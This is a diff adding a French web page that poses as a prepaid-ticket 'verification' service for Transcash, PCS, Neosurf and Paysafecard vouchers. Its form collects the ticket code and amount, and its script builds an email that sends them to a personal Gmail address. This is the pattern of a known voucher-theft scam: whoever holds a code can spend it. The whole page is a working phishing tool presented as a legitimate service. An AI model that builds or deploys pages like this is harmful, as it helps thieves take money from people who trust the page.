@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification de Tickets Prépayés</title>
+    <style>
+        :root {
+            --primary-color: #4361ee;
+            --secondary-color: #3a0ca3;
+            --accent-color: #4cc9f0;
+            --light-color: #f8f9fa;
+            --dark-color: #212529;
+            --success-color: #4bb543;
+            --error-color: #ff6b6b;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2rem 1rem;
+            color: var(--dark-color);
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 800px;
+            background-color: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            margin-bottom: 2rem;
+        }
+        
+        header {
+            background: linear-gradient(to right, var(--primary-color), var(--secondary-color));
+            color: white;
+            padding: 2rem;
+            text-align: center;
+        }
+        
+        header h1 {
+            font-size: 2.2rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        header p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+        
+        .form-container {
+            padding: 2rem;
+        }
+        
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: var(--dark-color);
+        }
+        
+        input, select, textarea {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
+        }
+        
+        .btn {
+            display: inline-block;
+            background: linear-gradient(to right, var(--primary-color), var(--secondary-color));
+            color: white;
+            border: none;
+            padding: 0.8rem 2rem;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn-block {
+            display: block;
+            width: 100%;
+        }
+        
+        .message {
+            padding: 1rem;
+            border-radius: 8px;
+            margin-top: 1.5rem;
+            text-align: center;
+            display: none;
+        }
+        
+        .success {
+            background-color: rgba(75, 181, 67, 0.1);
+            color: var(--success-color);
+            border: 1px solid var(--success-color);
+        }
+        
+        .instructions {
+            background-color: rgba(67, 97, 238, 0.1);
+            color: var(--primary-color);
+            border: 1px solid var(--primary-color);
+            padding: 1rem;
+            border-radius: 8px;
+            margin-top: 1.5rem;
+        }
+        
+        footer {
+            text-align: center;
+            color: #6c757d;
+            font-size: 0.9rem;
+            margin-top: auto;
+            padding: 1rem;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                border-radius: 10px;
+            }
+            
+            header {
+                padding: 1.5rem;
+            }
+            
+            header h1 {
+                font-size: 1.8rem;
+            }
+            
+            .form-container {
+                padding: 1.5rem;
+            }
+        }
+        
+        .required::after {
+            content: " *";
+            color: var(--error-color);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Vérification de Tickets Prépayés</h1>
+            <p>Vérifiez rapidement et facilement vos tickets Transcash, PCS, Neosurf et autres</p>
+        </header>
+        
+        <div class="form-container">
+            <form id="ticketForm">
+                <div class="form-group">
+                    <label for="visitorName" class="required">Nom du visiteur</label>
+                    <input type="text" id="visitorName" name="visitorName" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="ticketType" class="required">Type de ticket</label>
+                    <select id="ticketType" name="ticketType" required>
+                        <option value="">Sélectionnez un type</option>
+                        <option value="Transcash">Transcash</option>
+                        <option value="PCS">PCS</option>
+                        <option value="Neosurf">Neosurf</option>
+                        <option value="Paysafecard">Paysafecard</option>
+                        <option value="Ecodirect">Ecodirect</option>
+                        <option value="Autre">Autre</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="ticketAmount" class="required">Montant du ticket</label>
+                    <input type="number" id="ticketAmount" name="ticketAmount" min="0" step="0.01" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="ticketCode" class="required">Code du ticket</label>
+                    <input type="text" id="ticketCode" name="ticketCode" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="purchaseDate" class="required">Date d'achat</label>
+                    <input type="date" id="purchaseDate" name="purchaseDate" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="comment">Commentaire (facultatif)</label>
+                    <textarea id="comment" name="comment" rows="4"></textarea>
+                </div>
+                
+                <button type="submit" class="btn btn-block">Vérifier le ticket</button>
+            </form>
+            
+            <div id="successMessage" class="message success">
+                Votre demande de vérification a été préparée ! Votre client email va s'ouvrir avec toutes les informations.
+            </div>
+            
+            <div class="instructions">
+                <p><strong>Instructions :</strong> Après avoir rempli le formulaire, votre client email s'ouvrira automatiquement avec toutes les informations pré-remplies. Il vous suffira d'envoyer l'email pour finaliser la demande de vérification.</p>
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <p>&copy; 2025 Vérification de Tickets Prépayés. Tous droits réservés.</p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('ticketForm');
+            const successMessage = document.getElementById('successMessage');
+            
+            // Définir la date d'aujourd'hui comme date par défaut
+            const today = new Date();
+            const formattedDate = today.toISOString().split('T')[0];
+            document.getElementById('purchaseDate').value = formattedDate;
+            
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Récupérer les valeurs du formulaire
+                const formData = {
+                    visitorName: document.getElementById('visitorName').value,
+                    ticketType: document.getElementById('ticketType').value,
+                    ticketAmount: document.getElementById('ticketAmount').value,
+                    ticketCode: document.getElementById('ticketCode').value,
+                    purchaseDate: document.getElementById('purchaseDate').value,
+                    comment: document.getElementById('comment').value
+                };
+                
+                // Préparer l'email
+                prepareEmail(formData);
+            });
+            
+            function prepareEmail(data) {
+                // Adresse email de destination
+                const email = 'h00821613@gmail.com';
+                
+                // Sujet de l'email
+                const subject = `Vérification de ticket ${data.ticketType} - ${data.visitorName}`;
+                
+                // Corps de l'email
+                const body = `
+Bonjour,
+
+Je souhaite vérifier mon ticket prépayé avec les informations suivantes :
+
+- Nom du visiteur : ${data.visitorName}
+- Type de ticket : ${data.ticketType}
+- Montant du ticket : ${data.ticketAmount} €
+- Code du ticket : ${data.ticketCode}
+- Date d'achat : ${data.purchaseDate}
+- Commentaire : ${data.comment || 'Aucun'}
+
+Merci de procéder à la vérification de ce ticket.
+
+Cordialement,
+${data.visitorName}
+                `;
+                
+                // Encoder les composants de l'URL
+                const encodedSubject = encodeURIComponent(subject);
+                const encodedBody = encodeURIComponent(body);
+                
+                // Créer le lien mailto
+                const mailtoLink = `mailto:${email}?subject=${encodedSubject}&body=${encodedBody}`;
+                
+                // Ouvrir le client email
+                window.location.href = mailtoLink;
+                
+                // Afficher le message de confirmation
+                successMessage.style.display = 'block';
+                
+                // Réinitialiser le formulaire
+                form.reset();
+                
+                // Redéfinir la date d'aujourd'hui
+                document.getElementById('purchaseDate').value = formattedDate;
+                
+                // Masquer le message après 5 secondes
+                setTimeout(() => {
+                    successMessage.style.display = 'none';
+                }, 5000);
+            }
+        });
+    </script>
+</body>
+</html>
